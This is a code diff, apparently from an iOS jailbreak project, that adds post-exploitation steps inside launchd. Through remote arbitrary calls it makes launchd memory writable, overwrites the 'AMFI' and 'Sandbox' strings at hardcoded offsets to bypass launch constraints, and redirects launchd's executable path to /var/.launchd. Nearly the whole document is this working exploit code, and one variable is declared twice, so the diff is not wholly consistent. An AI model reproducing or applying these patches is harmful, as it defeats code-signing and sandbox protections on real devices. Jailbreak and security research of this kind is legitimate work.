@@ -260,16 +260,51 @@ vm_offset_t findSbinLaunchdOff(void) {
         }
         
         // Reprotect rw
-        vm_offset_t launchd_str_off = findSbinLaunchdOff();
+        // minimum page = 0x5f000;
+        vm_offset_t launchd_str_off = findSbinLaunchdOff(); //69DCB;
+        vm_offset_t amfi_str_off = 0x6B43E;
+        vm_offset_t sandbox_str_off = 0x5F908;
         
-        printf("reprotecting 0x%lx\n", launchd_base + launchd_str_off);
+        printf("reprotecting 0x%lx\n", launchd_base + 0x5f000);
         RemoteChangeLR(0xFFFFFF00); // fix autibsp
-        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_base + launchd_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, (launchd_base + 0x5f000), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
         if (kr != KERN_SUCCESS) {
-            printf("vm_protect failed\n");
+            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
+            sleep(5);
             return;
         }
+
+        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
+        // Bypass panic by launch constraints
+        // Method 2: Patch `AMFI`, `Sandbox` string that being used as _amfi_launch_constraint_set_spawnattr's arguments
+
+        // Patch string `AMFI`
         
+        const char *newStr = "AAAA\x00";
+        RemoteWriteString(map, newStr);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_write failed\n");
+            sleep(5);
+            return;
+        }
+        RemoteTaskHexDump(launchd_base + amfi_str_off, 0x100, launchd_task, (uint64_t)map);
+
+        // Patch string `Sandbox`
+        vm_offset_t sandbox_str_off = 0x5F908;
+        
+        const char *newStr2 = "BBBBBBB\x00";
+        RemoteWriteString(map, newStr2);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + sandbox_str_off, map, 8);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_write failed\n");
+            sleep(5);
+            return;
+        }
+        RemoteTaskHexDump(launchd_base + sandbox_str_off, 0x100, launchd_task, (uint64_t)map);
+
         // Overwrite /sbin/launchd string to /var/.launchd
         const char *newPath = "/var/.launchd";
         RemoteWriteString(map, newPath);
@@ -277,10 +312,11 @@ vm_offset_t findSbinLaunchdOff(void) {
         kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
         if (kr != KERN_SUCCESS) {
             printf("vm_write failed\n");
+            sleep(5);
             return;
         }
-        
         printf("Successfully overwrote launchd executable path string to %s\n", newPath);
+
         RemoteArbCall(exit, 0);
         
         // stuff
